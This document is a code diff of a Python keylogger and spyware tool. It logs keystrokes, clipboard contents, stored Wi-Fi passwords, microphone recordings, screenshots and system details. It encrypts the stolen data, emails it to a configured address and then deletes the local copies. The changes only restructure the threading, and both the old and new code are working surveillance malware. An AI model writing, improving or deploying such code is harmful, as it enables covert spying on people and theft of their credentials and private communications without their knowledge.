@@ -6,31 +6,21 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
-
 import socket
 import platform
-
 import win32clipboard
-
 import subprocess
 import re
-
 from pynput.keyboard import Listener
-
 import time
 import os
 import shutil
 import threading
-
 from scipy.io.wavfile import write
 import sounddevice as sd
-
 from cryptography.fernet import Fernet
-
 from requests import get
-
 from PIL import ImageGrab
-
 import json
 
 with open('config.json') as f:
@@ -44,7 +34,6 @@ clipboard_information = config["clipboard_information"]
 wifi_information = config["wifi_information"]
 audio_information = config["audio_information"]
 screenshot_information = config["screenshot_information"]
-
 
 keys_send_e = config["keys_send_e"]
 system_information_e = config["system_information_e"]
@@ -63,10 +52,14 @@ toaddr = config["toaddr"] # Enter the email address you want to send your inform
 key = config["key"] # Generate an encryption key from the Cryptography folder
 
 file_path = config["file_path"] # Enter the file path you want your files to be saved to
+
 if not os.path.exists(file_path):
     os.makedirs(file_path)
+
 extend = "\\"
 file_merge = file_path + extend
+
+encryption_done = False
 
 files_to_encrypt = [file_merge + clipboard_information, file_merge + keys_send]
 send_file_names = [file_merge + clipboard_information_e, file_merge + keys_send_e, file_merge + audio_information, file_merge + screenshot_information ]
@@ -132,7 +125,8 @@ def computer_information():
         f.write("Machine: " + platform.machine() + "\n")
         f.write("Hostname: " + hostname + "\n")
         f.write("Private IP Address: " + IPAddr + "\n")
-t1 = threading.Thread(target=computer_information, name='t1')
+t1 = threading.Thread(target=computer_information)
+t1.start()
 
 # get the clipboard contents
 def copy_clipboard():
@@ -146,7 +140,7 @@ def copy_clipboard():
 
         except:
             f.write("Clipboard could be not be copied")
-t2 = threading.Thread(target=copy_clipboard, name='t2')
+
 
 #get the wifi profiles
 def get_wifi_profiles():
@@ -191,7 +185,8 @@ def save_wifi_passwords():
         
         for profile, password in wifi_profiles:
             f.write(f"SSID: {profile}\nPassword: {password}\n\n")
-t3 = threading.Thread(target=save_wifi_passwords, name='t3')
+t3 = threading.Thread(target=save_wifi_passwords)
+t3.start()
 
 # get the microphone
 def microphone():
@@ -202,13 +197,11 @@ def microphone():
     sd.wait()
 
     write(file_path + extend + audio_information, fs, myrecording)
-t4 = threading.Thread(target=microphone, name='t4')
 
 # get screenshots
 def screenshot():
     im = ImageGrab.grab()
     im.save(file_path + extend + screenshot_information)
-t5 = threading.Thread(target=screenshot, name='t5')
 
 # Encrypt files
 def encryption():
@@ -225,20 +218,18 @@ def encryption():
         with open(send_file_names[count], 'wb') as f:
             f.write(encrypted)
         count += 1
-       
+t6 = threading.Thread(target=encryption)    
+
 #send all the logs
 def sending_files():
     count = 0
-    encryption()
     for files in send_file_names:
         send_email(files, send_file_names[count], toaddr)
         count+=1
-t6 = threading.Thread(target=sending_files, name='t6')
+t7 = threading.Thread(target=sending_files)
 
 #onetime log with system information
-def start_up():
-    t1.start()
-    t3.start()
+def send_once():
     count = 0
     t1.join()
     t3.join()
@@ -254,23 +245,12 @@ def start_up():
     for files in encrypted_system_files:
         send_email(files, encrypted_system_files[count], toaddr)
         count+=1 
-
-start_up()
+t8 = threading.Thread(target=send_once)
+t8.start()
 
 number_of_iterations = 0
 currentTime = time.time()
 stoppingTime = time.time() + time_iteration
-
-#tasks to be ran parallel to keylogger
-def parallel_tasks():
-        t2.start() 
-        t4.start()
-        t5.start()
-        t2.join()
-        t4.join()
-        t5.join()
-        t6.start()
-        t6.join()
 
 #keylogger file function
 def write_file(keys):
@@ -302,9 +282,17 @@ def on_release(key):
     if currentTime > stoppingTime:
         return False
 
+
 # counter for keylogger
 while number_of_iterations < number_of_iterations_end:
-
+    threads = []
+    threads.extend([ threading.Thread(target=copy_clipboard),
+                    threading.Thread(target=microphone),
+                    threading.Thread(target=screenshot)])
+    
+    for thread in threads:
+        thread.start()
+    
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
     
@@ -312,15 +300,21 @@ while number_of_iterations < number_of_iterations_end:
         shutil.copyfile(file_merge + keys_information, file_merge + keys_send)
         with open(file_merge + keys_information, "w") as f:
             f.write(" ")
-     
-        parallel_thread = threading.Thread(target=parallel_tasks)
-        parallel_thread.start()
-                        
-    number_of_iterations += 1
-    currentTime = time.time()
-    stoppingTime = time.time() + time_iteration
+        
+        number_of_iterations += 1
+        currentTime = time.time()
+        stoppingTime = time.time() + time_iteration
+         
+    if all(not thread.is_alive() for thread in threads):
+        if not encryption_done:
+            t6.start()
+            encryption_done = True
+        if not t6.is_alive():
+            t7.start()
+                            
 
-parallel_thread.join()
+t7.join()
+t8.join()
 delete_files =  system_files + encrypted_system_files + files_to_encrypt + send_file_names 
 for file in delete_files:
     os.remove(file)
